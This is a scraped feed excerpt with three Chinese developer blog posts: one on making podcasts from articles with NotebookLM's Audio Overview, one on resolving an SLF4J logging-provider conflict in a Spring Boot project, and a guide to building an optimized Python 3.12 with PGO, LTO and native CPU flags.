<p>不是那种要录音、剪辑、配背景音乐的传统播客，而是更轻量的——<br/>
写完内容，就能生成一段能听的音频。</p>
<p>后来试了 Google 的 <strong>NotebookLM</strong>，发现它的 Podcast 功能比我想象中实用很多，于是就记录一下整个过程，给同样想做内容复用的人一个参考。</p>
<h2 data-id="heading-0">NotebookLM 是什么？</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2026%2F01%2Fimage-7.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2026/01/image-7.png" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c0231d8c4ba41ada2683733417406bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874323&amp;x-signature=lwDddig7IwtiMdVas7uPp5ANUfU%3D" alt="" loading="lazy"/></a></p>
<p>NotebookLM 可以简单理解为一个“基于资料工作的 AI 笔记本”。</p>
<p>你把文档丢给它，它不会自己瞎发挥，而是<strong>只围绕你提供的内容来理解和整理</strong>。这一点和普通聊天式 AI 很不一样。</p>
<p>我一般拿它来做几件事：</p>
<ul>
<li>看长文档的重点</li>
<li>整理文章结构</li>
<li>把已有内容换一种形式输出</li>
</ul>
<p>而 Podcast 功能，正好属于最后这一类。</p>
<h2 data-id="heading-1">NotebookLM 的 Podcast 是怎么一回事？</h2>
<p>NotebookLM 里有一个叫 <strong>Audio Overview</strong> 的功能。</p>
<p>它做的事情其实很简单：</p>
<blockquote>
<p>把你上传的资料，整理成一段可以“听”的内容。</p>
</blockquote>
<p>生成的音频通常是两个人对话的形式，有点像播客里主持人和嘉宾在聊天那种感觉，但内容全部来自你自己的文档。</p>
<p>不是念文章，也不是逐字朗读，而是<strong>重新组织之后讲给你听</strong>。</p>
<p>第一次点生成的时候，我其实没抱太大期望，但出来的效果意外地还可以。</p>
<h2 data-id="heading-2">我是怎么用它做 Podcast 的？</h2>
<p>整个流程非常简单。</p>
<h3 data-id="heading-3">1. 先准备一篇完整文章</h3>
<p>我一般用：</p>
<ul>
<li>博客正文</li>
<li>教程文档</li>
<li>学习笔记</li>
</ul>
<p>字数大概在 2000–4000 字左右比较合适。</p>
<p>内容结构越清晰，后面生成的音频就越自然。</p>
<p>我这里选择之前写的一篇文章如下：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.liuhaihua.cn%2Farchives%2F719898.html" target="_blank" title="https://www.liuhaihua.cn/archives/719898.html" ref="nofollow noopener noreferrer">www.liuhaihua.cn/archives/71…</a></p>
<h3 data-id="heading-4">2. 新建一个 Notebook</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2026%2F01%2Fimage-8.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2026/01/image-8.png" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d29f2d7619c4484292f40488471515c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874323&amp;x-signature=1ZuYL%2FANX5f7zboo2w4sFN7Tuao%3D" alt="" loading="lazy"/></a></p>
<p>打开 NotebookLM，新建 notebook，然后把文章丢进去。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2026%2F01%2Fimage-9.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2026/01/image-9.png" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ca22eb1273d4905b81646a26743efde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874323&amp;x-signature=Li8y9KTTZKqixO31crcBNuUjrOU%3D" alt="" loading="lazy"/></a></p>
<p>不需要额外提示词，也不用写脚本。</p>
<p>它会先“读”你的内容。</p>
<h3 data-id="heading-5">3. 生成 Audio Overview</h3>
<p>点击 Audio Overview，等一会儿。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2026%2F01%2Fimage-10.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2026/01/image-10.png" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b17de08f1a04189bdd8f24f0961b116~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770874323&amp;x-signature=QccoJj515%2F4ci5H1a%2BGlwf6P6zw%3D" alt="" loading="lazy"/></a></p>
<p>通常一两分钟，就能生成一段完整音频，包括：</p>
<ul>
<li>简单开场</li>
<li>主题解释</li>
<li>重点拆解</li>
<li>最后的总结</li>
</ul>
<p>整体听下来，很像一期 5–10 分钟的知识播客。</p>
<h3 data-id="heading-6">4. 下载音频</h3>
<p>生成后可以直接下载音频文件，用来：</p>
<ul>
<li>嵌入博客页面</li>
<li>上传播客平台</li>
<li>当作学习音频</li>
</ul>
<p>我上传喜马拉雅了，大家可以去听一下效果</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fm.ximalaya.com%2Fsound%2F953017573%3Ffrom%3Dpc" target="_blank" title="https://m.ximalaya.com/sound/953017573?from=pc" ref="nofollow noopener noreferrer">m.ximalaya.com/sound/95301…</a></p>
<h2 data-id="heading-7">实际用下来，有哪些优点？</h2>
<h3 data-id="heading-8">1. 不用录音，真的省事</h3>
<p>以前想做播客，最大的问题不是不会说，而是太麻烦：</p>
<ul>
<li>找时间</li>
<li>调环境</li>
<li>剪杂音</li>
</ul>
<p>NotebookLM 这一套，基本是<strong>点一下就好</strong>。</p>
<p>对个人站长来说很友好。</p>
<h3 data-id="heading-9">2. 内容不会跑偏</h3>
<p>它不会凭空加观点，也不会乱发挥。</p>
<p>播客里的内容基本都能在原文里找到对应位置，这点我个人很看重。</p>
<p>尤其是技术类、教程类内容，准确性比“听起来像人”更重要。</p>
<h3 data-id="heading-10">3. 特别适合内容复用</h3>
<p>如果你本来就有：</p>
<ul>
<li>博客</li>
<li>教程</li>
<li>文档</li>
<li>笔记</li>
</ul>
<p>那几乎是“白送”的一个内容形态。</p>
<p>写一次，多用一次。</p>
<h2 data-id="heading-11">哪些人比较适合用？</h2>
<p>我觉得最适合的几类人是：</p>
<ul>
<li>写技术博客的</li>
<li>做知识类内容的</li>
<li>独立站站长</li>
<li>不想露脸、不想录音的人</li>
</ul>
<p>如果你已经在写东西，那用 NotebookLM 做 Podcast 几乎没有额外成本。</p>
<h2 data-id="heading-12">一点个人使用建议</h2>
<p>用了一段时间后，我自己总结了几点：</p>
<ul>
<li><strong>文章结构比文采更重要</strong></li>
<li>小标题清晰，生成效果会好很多</li>
<li>单篇控制在 10 分钟以内体验最好</li>
</ul>
<p>它更适合“讲清楚一件事”，而不是情绪表达型播客。</p>
<h2 data-id="heading-13">写在最后</h2>
<p>NotebookLM 并不是要替代真人播客。</p>
<p>但对于已经在持续输出文字内容的人来说，它确实提供了一条很省力的路：</p>
<blockquote>
<p>文章写完，不只是给人看，也可以给人听。</p>
</blockquote>
<p>如果你本来就有内容，那这个功能值得一试。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot测试启动失败：SLF4J日志多实现冲突解决方案]]></title>    <link>https://juejin.cn/post/7602928783596421126</link>    <guid>https://juejin.cn/post/7602928783596421126</guid>    <pubDate>2026-02-05T04:22:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602928783596421126" data-draft-id="7603004323871244331" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot测试启动失败：SLF4J日志多实现冲突解决方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T04:22:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XuCoder"/> <meta itemprop="url" content="https://juejin.cn/user/948203954903908"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot测试启动失败：SLF4J日志多实现冲突解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/948203954903908/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XuCoder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T04:22:41.000Z" title="Thu Feb 05 2026 04:22:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在开发 Spring Boot +LangGraph4J项目时，打算利用阿里云百炼的文生图模型生成Logo图片，在引入了阿里云百炼 SDK（dashscope-sdk-java）后，执行单元测试（LogoGeneratorToolTest）时，项目直接启动失败，控制台打印大量报错日志:</p>
<pre><code class="hljs language-bash" lang="bash">SLF4J(W): Class path contains multiple SLF4J providers.
SLF4J(W): Found provider [org.slf4j.simple.SimpleServiceProvider@206a70ef]
SLF4J(W): Found provider [ch.qos.logback.classic.spi.LogbackServiceProvider@292b08d6]
...
Caused by: java.lang.IllegalStateException: LoggerFactory is not a Logback LoggerContext but Logback is on the classpath. Either remove Logback or the competing implementation (class org.slf4j.simple.SimpleLoggerFactory loaded from .../slf4j-simple-2.0.17.jar)
</code></pre>
<h3 data-id="heading-0">原因分析</h3>
<p>SLF4J（Simple Logging Facade for Java）是日志门面接口，本身不实现日志打印功能，需要绑定一个具体的日志实现组件（如Logback、Log4j、SLF4J-Simple等）。</p>
<p>其中，Logback是由spring-boot-starter-logging自动引入，Spring Boot官方推荐的日志组件，支持日志配置、文件滚动、异步打印等企业级特性。</p>
<p>而SLF4J-Simple是由阿里通义SDK（dashscope-sdk-java）依赖传递引入，是一个轻量但功能简单的日志实现。</p>
<p>由于在这个项目类路径下同时存在两个SLF4J的实现组件，违反了“一个日志门面+一个实现”的规范，导致Spring容器启动时无法确定使用哪个日志工厂，最终加载应用上下文失败。</p>
<h3 data-id="heading-1">解决方案</h3>
<p>保留Logback，排除冲突的SLF4J-Simple依赖，修改pom.xml，排除冲突依赖，通过标签排除其中的slf4j-simple依赖，具体配置如下：</p>
<pre><code class="hljs language-bash" lang="bash">&lt;!-- 阿里通义SDK依赖 --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
    &lt;artifactId&gt;dashscope-sdk-java&lt;/artifactId&gt;
    &lt;version&gt;2.21.1&lt;/version&gt;
    &lt;!-- 排除冲突的slf4j-simple依赖 --&gt;
    &lt;exclusions&gt;
        &lt;exclusion&gt;
            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;
            &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt;
        &lt;/exclusion&gt;
    &lt;/exclusions&gt;
&lt;/dependency&gt;
</code></pre>
<p>接下来，打开Maven面板➡️ 右键项目➡️选择“Reload Project”，等待依赖刷新完成，重新运行之前失败的单元测试，日志冲突问题解决。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[极致性能：为 OpenClaw 量身打造“满血版” Python 3.12 编译指南]]></title>    <link>https://juejin.cn/post/7602929352716369920</link>    <guid>https://juejin.cn/post/7602929352716369920</guid>    <pubDate>2026-02-05T04:57:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602929352716369920" data-draft-id="7602825342229397538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="极致性能：为 OpenClaw 量身打造“满血版” Python 3.12 编译指南"/> <meta itemprop="keywords" content="性能优化"/> <meta itemprop="datePublished" content="2026-02-05T04:57:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HarmonSir"/> <meta itemprop="url" content="https://juejin.cn/user/4355613340469737"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            极致性能：为 OpenClaw 量身打造“满血版” Python 3.12 编译指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4355613340469737/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HarmonSir
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T04:57:23.000Z" title="Thu Feb 05 2026 04:57:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在 Proxmox VE (PVE) 环境下，LXC 容器是部署高性能服务的理想选择。近期在配置 <strong>OpenClaw</strong> 环境时，我发现官方预装或常规安装的 Python 往往在性能上有所保留，甚至缺失关键的扩展模块。为了实现 OpenClaw 的极致响应，我们需要从源码开始，剔除臃肿的工具包，精准构建一个专属于当前硬件架构的“满血版” Python 3.12。</p>
<hr/>
<h2 data-id="heading-1">一、 清理与精准定位：拒绝“全家桶”</h2>
<p>许多教程会推荐安装 <code>build-essential</code>，但这包含了很多我们不需要的冗余工具。作为追求精准的开发者，我们应直接瞄准核心。</p>
<h3 data-id="heading-2">1. 彻底清理旧版本</h3>
<p>在开始之前，确保没有任何“半成品”干扰。</p>
<pre><code class="hljs language-bash" lang="bash">pyenv uninstall -f 3.12.12
</code></pre>
<h3 data-id="heading-3">2. 精准安装核心组件</h3>
<p>除了编译器 <code>gcc</code> 和构建工具 <code>make</code>，Python 的核心功能（如 SSL 联网、LZMA 压缩、FFI 调用）需要特定的开发库支持。</p>
<pre><code class="hljs language-bash" lang="bash">sudo apt update
sudo apt install -y --no-install-recommends \
    gcc make pkg-config \
    libssl-dev \
    libffi-dev \
    zlib1g-dev \
    liblzma-dev \
    libsqlite3-dev
</code></pre>
<ul>
<li><strong>关键点</strong>：<code>libssl-dev</code> 是 OpenClaw 联网及 <code>pip</code> 安装包的基础；<code>liblzma-dev</code> 解决了常见的 <code>_lzma</code> 模块缺失报错。</li>
</ul>
<hr/>
<h2 data-id="heading-4">二、 性能压榨：PGO + LTO + Native 三箭齐发</h2>
<p>为了让 Python 运行效率最大化，我们将开启编译器最顶级的三个开关：</p>
<ol>
<li><strong>PGO (Profile Guided Optimization)</strong>：通过真实的自动化测试“训练”编译器，让它知道哪些代码路径最常用，从而进行重点优化。</li>
<li><strong>LTO (Link Time Optimization)</strong>：在链接阶段进行全局优化，抹平函数跨模块调用的开销。</li>
<li><strong>-march=native</strong>：放弃通用性，直接针对你当前的物理 CPU 指令集（如 AVX2、AVX-512）生成机器码。</li>
</ol>
<hr/>
<h2 data-id="heading-5">三、 实战指令：极致性能的联合编译</h2>
<p>在 <code>pyenv</code> 环境下，通过环境变量注入，确保每一个优化参数都物理写入二进制文件。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 强制指定支持 LTO 的二进制工具链</span>
<span class="hljs-built_in">export</span> AR=<span class="hljs-string">"gcc-ar"</span>
<span class="hljs-built_in">export</span> NM=<span class="hljs-string">"gcc-nm"</span>
<span class="hljs-built_in">export</span> RANLIB=<span class="hljs-string">"gcc-ranlib"</span>

<span class="hljs-comment"># 2. 注入硬件原生优化与全量优化标志</span>
<span class="hljs-built_in">export</span> CFLAGS=<span class="hljs-string">"-march=native -O3 -flto=auto"</span>
<span class="hljs-built_in">export</span> LDFLAGS=<span class="hljs-string">"-flto=auto -fuse-linker-plugin"</span>

<span class="hljs-comment"># 3. 启动“炼丹”：全量优化并开启共享库支持</span>
PYTHON_CONFIGURE_OPTS=<span class="hljs-string">"--enable-optimizations --with-lto --enable-shared"</span> \
pyenv install 3.12.12
</code></pre>
<blockquote>
<p><strong>注意</strong>：由于开启了 <code>--enable-optimizations</code>，系统会运行数百个测试用例。这会导致编译时间延长 3-5 倍，且 CPU 会满载，这是正常现象。</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">四、 深度验证：确保“优化”并非虚有其表</h2>
<p>编译完成后，我们必须验证这些极致参数是否真的生效了，而不是被编译器悄悄丢弃。</p>
<h3 data-id="heading-7">1. 检查编译配置记录</h3>
<p>运行以下命令，查看 Python 记录的配置参数：</p>
<pre><code class="hljs language-bash" lang="bash">python3.12 -c <span class="hljs-string">"import sysconfig; print(sysconfig.get_config_var('CONFIG_ARGS'))"</span>
</code></pre>
<ul>
<li><strong>要点</strong>：输出结果中必须包含 <code>--with-lto</code> 和 <code>-march=native</code>。只要这些字符串存在，说明二进制文件已经“入味”了。</li>
</ul>
<h3 data-id="heading-8">2. 功能模块自检</h3>
<p>确保 OpenClaw 依赖的底层扩展编译成功：</p>
<pre><code class="hljs language-bash" lang="bash">python3.12 -c <span class="hljs-string">"import _ssl, _lzma, _sqlite3; print('满血状态检测：模块完整，性能全开！')"</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">五、 部署要点：性能与兼容性的博弈</h2>
<p>虽然 <code>-march=native</code> 带来了极高的运行效率，但你也需要记住它的代价：</p>
<ul>
<li><strong>硬件绑定</strong>：此 Python 只能在相同或更高架构的 CPU 上运行。如果你将此 LXC 容器迁移到一台指令集过旧的宿主机上，程序会报 <code>Illegal instruction</code> 崩溃。</li>
<li><strong>环境一致性</strong>：由于开启了 <code>--enable-shared</code>，如果需要迁移，必须确保目标系统的 <code>glibc</code> 版本不低于编译环境。</li>
</ul>
<hr/>
